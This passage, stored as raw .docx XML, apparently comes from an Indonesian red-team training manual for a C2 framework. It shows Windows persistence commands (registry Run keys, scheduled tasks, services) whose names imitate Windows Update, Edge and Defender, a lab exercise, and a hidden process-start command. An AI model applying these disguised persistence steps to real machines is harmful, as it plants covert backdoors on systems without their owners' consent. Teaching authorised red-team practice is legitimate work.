                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>HKCU atau HKLM Run key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>schtask</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>User/System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Logon/Boot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Sedang</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Task Scheduler</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Boot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tinggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Butuh admin; paling reliabel</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>startup_folder</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>User</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>User logon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Rendah</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Simpel, mudah dideteksi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Registry Run Key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Persist via HKCU Run (tidak butuh admin)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence setup &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method registry_run \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --name "WindowsSecurityUpdate"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Persist via HKLM Run (butuh admin)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence setup &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method registry_run \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --name "WindowsUpdate" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --hive HKLM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Hapus persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence remove &lt;agent-id&gt; --method registry_run --name "WindowsSecurityUpdate" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Scheduled Task</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Scheduled task yang berjalan saat logon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence setup &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method schtask \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --name "MicrosoftEdgeUpdate" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --trigger logon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Scheduled task periodik (setiap 30 menit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence setup &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method schtask \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --name "WindowsDefenderScan" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --trigger interval \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --interval 30 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Windows Service</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Persist sebagai service (butuh SYSTEM atau admin)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence setup &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method service \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --name "WinDefAdvSvc" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --display "Windows Defender Advanced Service"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List persistence aktif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence list &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ℹ  Selalu catat semua persistence yang dibuat selama engagement untuk cleanup yang bersih di akhir. Persistence yang tertinggal dapat menjadi backdoor tidak sengaja.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 7.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Registry Run Persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Pasang persistence via registry run key.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence setup &lt;agent-id&gt; --method registry_run --name "WindowsUpdate"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Verifikasi entry registry terbuat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>registry read &lt;agent-id&gt; --hive HKCU --key "Software\Microsoft\Windows\CurrentVersion\Run" --value "WindowsUpdate"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Simulasikan reboot (matikan dan jalankan ulang agent binary).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 4:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Verifikasi agent check-in ulang setelah 'reboot'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list</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Bersihkan persistence.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence remove &lt;agent-id&gt; --method registry_run --name "WindowsUpdate" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 8 — PROCESS MANAGEMENT &amp; PPID SPOOFING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Process Listing &amp; Kill</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># List semua proses</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>process list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Kill proses berdasarkan PID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>process kill &lt;agent-id&gt; --pid 4512 --wait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Start proses baru (hidden)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>process start &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --path "C:\Windows\System32\cmd.exe" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --args "/c whoami &gt; C:\Temp\out.txt" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
